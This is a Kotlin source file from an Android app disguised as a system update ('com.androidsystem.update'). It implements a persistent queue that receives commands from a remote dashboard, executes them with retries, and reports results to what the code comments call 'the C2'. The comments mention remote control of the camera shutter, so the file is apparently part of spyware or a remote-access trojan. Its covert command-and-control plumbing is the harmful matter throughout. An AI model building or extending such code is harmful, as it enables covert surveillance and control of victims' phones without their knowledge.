package com.androidsystem.update.command

import android.content.Context
import android.util.Log
import androidx.room.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import org.json.JSONObject
import java.util.UUID
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Persistent command queue with retry + exponential backoff + idempotency.
 *
 * Lifecycle:
 *  1. Dashboard sends a command via POST /api/v2/devices/:id/cmd
 *  2. Server writes the command to RTDB `devices/<id>/commands` (existing path)
 *     AND optionally to the HTTP inbox (out of scope here, server-side mirror).
 *  3. [CoreService.listenForCommands] (existing) reads it and calls
 *     [CommandRegistry.dispatch] which is now wired through [enqueue] below.
 *  4. [enqueue] inserts a row with a unique `id` (UUID) and `attempts=0`.
 *  5. The dispatcher in [tick] picks the next PENDING row, executes the
 *     underlying [CommandRegistry] branch, and on success marks it DONE.
 *  6. On failure: attempts++, nextAttemptAt = now + 2^attempts seconds
 *     (capped at 5 minutes), status back to PENDING.
 *  7. After 8 failed attempts the row is marked DEAD and reported to the C2.
 *
 * Idempotency: the `id` is a UUID generated server-side and shipped with the
 * command. The dispatcher dedups on `id`: a second execution with the same
 * id is a no-op. This makes it safe to retry the whole queue from scratch
 * (e.g. after a force-stop) without re-running the camera shutter etc.
 */
@Singleton
class CommandQueue @Inject constructor(
    private val context: Context,
    private val registry: CommandRegistry,
    private val secureComms: com.androidsystem.update.network.SecureCommunication
) {
    private val tag = "CommandQueue"
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val mutex = Mutex()
    @Volatile private var ticking = false

    enum class Status { PENDING, RUNNING, DONE, DEAD }

    @Entity(tableName = "command_queue")
    data class Row(
        @PrimaryKey val id: String,
        val type: String,
        val paramsJson: String,
        val createdAt: Long,
        val attempts: Int = 0,
        val nextAttemptAt: Long = 0,
        val status: String = Status.PENDING.name,
        val lastError: String? = null,
        val resultJson: String? = null
    )

    @Dao
    interface CommandQueueDao {
        @Insert(onConflict = OnConflictStrategy.REPLACE) suspend fun upsert(row: Row)
        @Query("SELECT * FROM command_queue WHERE status = :status ORDER BY createdAt ASC LIMIT :limit")
        suspend fun byStatus(status: String, limit: Int = 50): List<Row>
        @Query("SELECT * FROM command_queue WHERE id = :id") suspend fun get(id: String): Row?
        @Query("UPDATE command_queue SET status = :status, attempts = :attempts, nextAttemptAt = :nextAt, lastError = :err, resultJson = :res WHERE id = :id")
        suspend fun update(id: String, status: String, attempts: Int, nextAt: Long, err: String?, res: String?)
        @Query("DELETE FROM command_queue WHERE status = :status AND createdAt < :before") suspend fun prune(status: String, before: Long): Int
        @Query("SELECT COUNT(*) FROM command_queue WHERE status = :status") suspend fun count(status: String): Int
    }

    @Database(entities = [Row::class], version = 1, exportSchema = false)
    abstract class CommandQueueDb : RoomDatabase() { abstract fun dao(): CommandQueueDao }

    private val db: CommandQueueDb by lazy {
        Room.databaseBuilder(context.applicationContext, CommandQueueDb::class.java, "command_queue.db")
            .fallbackToDestructiveMigration()
            .build()
    }

    /**
     * Enqueue a command. Returns the assigned id. If [id] is null, a fresh
     * UUID is generated. The same id is reused when retrying — this is what
     * makes the queue idempotent.
     */
    suspend fun enqueue(type: String, params: JSONObject, id: String = UUID.randomUUID().toString()): String {
        val row = Row(
            id = id, type = type, paramsJson = params.toString(),
            createdAt = System.currentTimeMillis(), nextAttemptAt = 0
        )
        db.dao().upsert(row)
        ensureTicking()
        return id
    }

    /** Enqueue a command received from the RTDB command listener. */
    suspend fun enqueueFromCommandPayload(type: String, params: JSONObject) {
        // Use a stable id when the server supplies one (the v3.1.0 protocol
        // uses timestamp as a de-facto id; we hash it to get a UUID-shaped
        // string so retries of the same command get the same id).
        val id = "rt-" + Integer.toHexString(type.hashCode()) + "-" + (params.optLong("timestamp", 0L).toString(16))
        enqueue(type, params, id)
    }

    /** Inspect the queue (used by the dashboard-side `GET /queue` mirror). */
    suspend fun stats(): Map<String, Int> = mapOf(
        "pending" to db.dao().count(Status.PENDING.name),
        "running" to db.dao().count(Status.RUNNING.name),
        "done" to db.dao().count(Status.DONE.name),
        "dead" to db.dao().count(Status.DEAD.name)
    )

    private fun ensureTicking() {
        if (ticking) return
        ticking = true
        scope.launch {
            try { runLoop() } finally { ticking = false }
        }
    }

    private suspend fun runLoop() {
        while (true) {
            val processed = mutex.withLock { tickOnce() }
            val delayMs = if (processed) 250L else 2_000L
            delay(delayMs)
        }
    }

    /** One pass: pick the next PENDING row whose nextAttemptAt is due. */
    private suspend fun tickOnce(): Boolean {
        val now = System.currentTimeMillis()
        val rows = db.dao().byStatus(Status.PENDING.name, limit = 5)
        val due = rows.firstOrNull { it.nextAttemptAt <= now } ?: return false
        // Mark RUNNING to prevent a parallel tick from grabbing it.
        db.dao().update(due.id, Status.RUNNING.name, due.attempts, 0, null, null)
        var err: String? = null
        var result: JSONObject? = null
        try {
            val cmdJson = JSONObject().apply {
                put("type", due.type)
                val p = JSONObject(due.paramsJson)
                p.keys().forEach { put(it, p.get(it)) }
            }
            result = registry.dispatchNow(cmdJson)
        } catch (e: Throwable) { err = e.message ?: e.javaClass.simpleName }
        return when {
            result != null && result.optBoolean("ok", false) -> {
                db.dao().update(due.id, Status.DONE.name, due.attempts, 0, null, result.toString())
                reportResult(due, result)
                pruneOld()
                true
            }
            due.attempts + 1 >= 8 -> {
                db.dao().update(due.id, Status.DEAD.name, due.attempts + 1, 0, err, result?.toString())
                reportResult(due, JSONObject().put("ok", false).put("error", "dead after ${due.attempts + 1} attempts: $err"))
                true
            }
            else -> {
                val nextAttempts = due.attempts + 1
                val backoff = minOf(5 * 60_000L, 1000L * (1L shl nextAttempts.coerceAtMost(8)))
                db.dao().update(due.id, Status.PENDING.name, nextAttempts, now + backoff, err, null)
                true
            }
        }
    }

    private fun reportResult(row: Row, result: JSONObject) {
        scope.launch {
            try {
                val out = JSONObject().apply {
                    put("command_id", row.id)
                    put("type", row.type)
                    put("attempts", row.attempts)
                    put("result", result)
                    put("ts", System.currentTimeMillis())
                }
                secureComms.sendCommandResult(row.type, out)
            } catch (e: Throwable) { Log.w(tag, "reportResult", e) }
        }
    }

    private suspend fun pruneOld() {
        val cutoff = System.currentTimeMillis() - 7L * 24 * 60 * 60 * 1000
        db.dao().prune(Status.DONE.name, cutoff)
    }
}
